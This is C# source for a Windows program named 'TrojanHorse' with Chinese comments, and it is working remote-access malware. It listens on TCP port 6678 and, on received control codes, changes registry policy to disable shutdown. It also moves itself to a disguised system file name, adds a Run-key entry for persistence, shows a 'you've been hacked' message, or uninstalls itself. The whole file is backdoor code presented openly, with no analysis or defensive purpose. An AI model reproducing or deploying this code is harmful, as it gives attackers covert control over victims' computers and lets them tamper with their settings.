using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Net;  //以下的名称空间是添加的
using System.Net.Sockets;
using System.Threading;
using System.IO;

namespace TrojanHorse
{
    public partial class Form1 : Form
    {        
        private TcpListener listener;
        private string mystr = "您好！非常抱歉，您的注册表：";
        private RegistryKey rrr = Registry.LocalMachine;
        private RegistryKey key1; 

        public Form1()
        {
            InitializeComponent();
            //加入你的侦听代码 
            //端口你可以自已设定,使用了固定的端口 
            int port = 6678;
            
            //System.Net.Sockets.TcpListener是用来在Tcp网络中侦听客户端的 
            listener = new TcpListener(port);
            //启动侦听 
            listener.Start();
            //增加接收控制码的线程,如果要停止线程可以用 Thread.abort() 
            //reControlCode 是线程启动执行的函数，此函数根据接收的控制 
            //控制码选取合适的注册表修改函数 
            Thread thread = new Thread(new ThreadStart(target));
            thread.Start();            
        }

        public void target()
        {
            Socket socket = listener.AcceptSocket();
            while (socket.Connected)
            {
                byte[] by = new Byte[6];
                int i = socket.Receive(by, by.Length, 0);
                string ss = System.Text.Encoding.ASCII.GetString(by);

                //以下是修改注册表		
                if (ss == "jiance")
                {
                    string str = "hjc";
                    byte[] bytee = System.Text.Encoding.ASCII.GetBytes(str.ToCharArray());
                    socket.Send(bytee, bytee.Length, 0);
                }
                if (ss == "zx0100")
                {
                    try
                    {
                        key1 = rrr.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true);
                        key1.SetValue("NoClose", 1);
                        key1.Close();
                        mystr = mystr + "LocalMachine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer键值NoClose被修改！请将它置为0！";
                    }
                    catch { }

                    if (key1 == null)
                    {
                        try
                        {
                            RegistryKey key2 = rrr.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
                            key2.SetValue("NoClose", 1);
                            key2.Close();
                            mystr = mystr + "LocalMachine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer键值NoClose被修改！请将它置为0！";
                        }
                        catch { }
                    }
                    string str = "hkz";
                    byte[] bytee = System.Text.Encoding.ASCII.GetBytes(str.ToCharArray());
                    socket.Send(bytee, bytee.Length, 0);
                }
                //以下是善意修改部分
                if (ss == "zs0100")
                {
                    try
                    {
                        key1 = rrr.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true);
                        key1.SetValue("NoClose", 0);
                        key1.Close();
                    }
                    catch { }
                    if (key1 == null)
                    {
                        try
                        {
                            RegistryKey key2 = rrr.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
                            key2.SetValue("NoClose", 0);
                            key2.Close();
                        }
                        catch { }
                    }
                    string str = "hkz";
                    byte[] bytee = System.Text.Encoding.ASCII.GetBytes(str.ToCharArray());
                    socket.Send(bytee, bytee.Length, 0);
                }
                //以下是警告
                if (ss == "jg0000")
                {
                    MessageBox.Show("你被我黑了!");
                    string str = "hkz";
                    byte[] bytee = System.Text.Encoding.ASCII.GetBytes(str.ToCharArray());
                    socket.Send(bytee, bytee.Length, 0);
                }
                //以下是建议
                if (ss == "jy0000")
                {
                    MessageBox.Show(mystr);
                    string str = "hkz";
                    byte[] bytee = System.Text.Encoding.ASCII.GetBytes(str.ToCharArray());
                    socket.Send(bytee, bytee.Length, 0);
                }
                //以下是修改木马位置
                if (ss == "mw1000")
                {
                    try
                    {
                        File.Move("c:\\winnt\\system\\expleror.exe", "c:\\winnt\\system32\\msdoss.exe");
                    }
                    catch { }

                    try
                    {
                        key1 = rrr.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        key1.SetValue("msdoss", "c:\\winnt\\system32\\msdoss.exe");

                        key1.Close();
                    }
                    catch { }
                    if (key1 == null)
                    {
                        try
                        {
                            RegistryKey key2 = rrr.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
                            key2.SetValue("msdoss", "c:\\winnt\\system32\\msdoss.exe");
                            key2.Close();
                        }
                        catch { }
                    }
                    string str = "hkz";
                    byte[] bytee = System.Text.Encoding.ASCII.GetBytes(str.ToCharArray());
                    socket.Send(bytee, bytee.Length, 0);
                }
                //以下是卸载木马
                if (ss == "xz0000")
                {
                    try
                    {
                        key1 = rrr.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                        try { key1.DeleteValue("expleror"); }
                        catch { }
                        try { key1.DeleteValue("msdoss"); }
                        catch { }
                        try { key1.DeleteValue("microsoftt"); }
                        catch { }
                        key1.Close();
                    }
                    catch { }

                    string str = "hkz";
                    byte[] bytee = System.Text.Encoding.ASCII.GetBytes(str.ToCharArray());
                    socket.Send(bytee, bytee.Length, 0);
                }
            }
        }
    }
}
